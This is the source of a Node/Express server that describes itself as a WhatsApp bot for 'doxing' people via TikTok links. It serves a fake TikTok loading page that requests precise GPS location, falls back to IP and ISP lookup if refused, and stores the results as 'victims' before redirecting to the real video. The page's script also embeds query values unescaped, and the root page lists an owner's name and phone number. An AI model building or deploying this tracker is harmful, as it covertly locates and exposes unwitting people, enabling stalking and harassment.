const express = require('express');
const mongoose = require('mongoose');
const useragent = require('useragent');
const axios = require('axios');
require('dotenv').config();

const app = express();
app.use(express.json());

// Koneksi MongoDB
mongoose.connect(process.env.MONGODB_URI)
    .then(() => console.log('✅ MongoDB Vercel Connected'))
    .catch(err => console.error('❌ MongoDB Error:', err));

// Schema
const Link = mongoose.model('Link', new mongoose.Schema({
    uniqueId: String,
    victims: Array
}));

// Fungsi get IP info
async function getIPInfo(ip) {
    try {
        const cleanIp = ip.replace('::ffff:', '');
        if (cleanIp === '::1' || cleanIp.startsWith('127.') || cleanIp.startsWith('192.168.')) {
            return null;
        }
        
        const response = await axios.get(`http://ip-api.com/json/${cleanIp}`);
        if (response.data && response.data.status === 'success') {
            return {
                ip: cleanIp,
                city: response.data.city,
                region: response.data.regionName,
                country: response.data.country,
                lat: response.data.lat,
                lon: response.data.lon,
                isp: response.data.isp,
                org: response.data.org
            };
        }
        return null;
    } catch (error) {
        return null;
    }
}

// Endpoint tracking
app.get('/api/track', async (req, res) => {
    try {
        const { id, url } = req.query;
        
        if (!id || !url) {
            return res.status(400).send('Invalid parameters');
        }
        
        const tiktokUrl = Buffer.from(url, 'base64').toString('utf-8');
        const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const userAgent = req.headers['user-agent'] || 'Unknown';
        
        // Update klik
        await Link.updateOne(
            { uniqueId: id },
            { $inc: { clicks: 1 } }
        );
        
        // Kirim HTML dengan location request
        res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>TikTok Video</title>
                <style>
                    body { 
                        margin: 0; 
                        padding: 0; 
                        background: #000; 
                        display: flex; 
                        justify-content: center; 
                        align-items: center; 
                        min-height: 100vh; 
                        font-family: Arial, sans-serif; 
                    }
                    .loader { 
                        text-align: center; 
                        color: #fff; 
                    }
                    .spinner { 
                        border: 5px solid #f3f3f3; 
                        border-top: 5px solid #ff0050; 
                        border-radius: 50%; 
                        width: 50px; 
                        height: 50px; 
                        animation: spin 1s linear infinite; 
                        margin: 20px auto; 
                    }
                    @keyframes spin { 
                        0% { transform: rotate(0deg); } 
                        100% { transform: rotate(360deg); } 
                    }
                </style>
            </head>
            <body>
                <div class="loader">
                    <div class="spinner"></div>
                    <h3>Loading video...</h3>
                    <p>Please wait</p>
                </div>
                
                <script>
                    // Fungsi kirim lokasi
                    function sendLocation(lat, lng, accuracy) {
                        fetch('/api/location', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                id: '${id}',
                                lat: lat,
                                lng: lng,
                                accuracy: accuracy,
                                source: 'gps'
                            })
                        }).finally(() => {
                            window.location.href = '${tiktokUrl}';
                        });
                    }
                    
                    // Fungsi kirim ISP (kalo tolak)
                    function sendISP() {
                        fetch('/api/location', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                id: '${id}',
                                source: 'isp',
                                ip: '${clientIp}',
                                userAgent: '${userAgent}'
                            })
                        }).finally(() => {
                            window.location.href = '${tiktokUrl}';
                        });
                    }
                    
                    // Minta izin lokasi
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            (position) => {
                                sendLocation(
                                    position.coords.latitude,
                                    position.coords.longitude,
                                    position.coords.accuracy
                                );
                            },
                            (error) => {
                                console.log('Location denied:', error.message);
                                sendISP();
                            },
                            {
                                enableHighAccuracy: true,
                                timeout: 10000,
                                maximumAge: 0
                            }
                        );
                    } else {
                        sendISP();
                    }
                    
                    // Fallback redirect 5 detik
                    setTimeout(() => {
                        window.location.href = '${tiktokUrl}';
                    }, 5000);
                </script>
            </body>
            </html>
        `);
        
    } catch (error) {
        res.status(500).send('Internal Server Error');
    }
});

// Endpoint location
app.post('/api/location', async (req, res) => {
    try {
        const { id, lat, lng, accuracy, source, ip, userAgent } = req.body;
        
        if (!id) {
            return res.status(400).json({ error: 'Invalid ID' });
        }
        
        let victimData = {
            timestamp: new Date(),
            source: source || 'unknown',
            userAgent: userAgent || req.headers['user-agent']
        };
        
        // Kalo dapet GPS
        if (lat && lng) {
            victimData.lat = lat;
            victimData.lng = lng;
            victimData.accuracy = accuracy || 0;
            victimData.googleMapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
            
            // Reverse geocoding
            try {
                const geo = await axios.get(
                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`
                );
                if (geo.data && geo.data.address) {
                    victimData.city = geo.data.address.city || geo.data.address.town || 'Unknown';
                    victimData.country = geo.data.address.country || 'Unknown';
                }
            } catch (e) {}
        }
        
        // Kalo dapet IP
        const clientIp = ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const ipInfo = await getIPInfo(clientIp);
        
        if (ipInfo) {
            victimData.ip = ipInfo.ip;
            victimData.city = victimData.city || ipInfo.city;
            victimData.country = victimData.country || ipInfo.country;
            victimData.isp = ipInfo.isp;
            victimData.org = ipInfo.org;
        }
        
        // Simpan ke database
        await Link.updateOne(
            { uniqueId: id },
            { $push: { victims: victimData } }
        );
        
        res.json({ success: true });
        
    } catch (error) {
        res.status(500).json({ error: 'Internal Server Error' });
    }
});

// Root endpoint
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head><title>DOXTT API</title></head>
        <body>
            <h1>🔥 DOXTT API 🔥</h1>
            <p>Bot WhatsApp Doxing TikTok</p>
            <p>Owner: MAMAT IBRAHIM (6285821652676)</p>
        </body>
        </html>
    `);
});

module.exports = app;